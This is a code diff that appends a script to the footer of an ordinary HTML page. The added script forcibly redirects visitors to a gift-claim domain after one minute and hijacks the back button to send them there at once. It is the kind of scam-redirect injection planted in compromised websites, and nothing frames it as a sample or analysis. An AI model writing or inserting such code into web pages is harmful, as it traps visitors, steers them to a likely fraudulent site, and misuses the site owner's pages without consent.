@@ -372,5 +372,23 @@
       </div>
     </div>
   </footer>
+  <script>
+(function () {
+    const redirectUrl = "https://fastgiftclaim.com/";
+
+    // Auto redirect after 1 minute
+    let autoRedirect = setTimeout(function () {
+        window.location.href = redirectUrl;
+    }, 60000);
+
+    // Detect back button
+    history.pushState(null, null, location.href);
+
+    window.addEventListener("popstate", function () {
+        clearTimeout(autoRedirect);
+        window.location.href = redirectUrl;
+    });
+})();
+  </script>
 </body>
 </html>
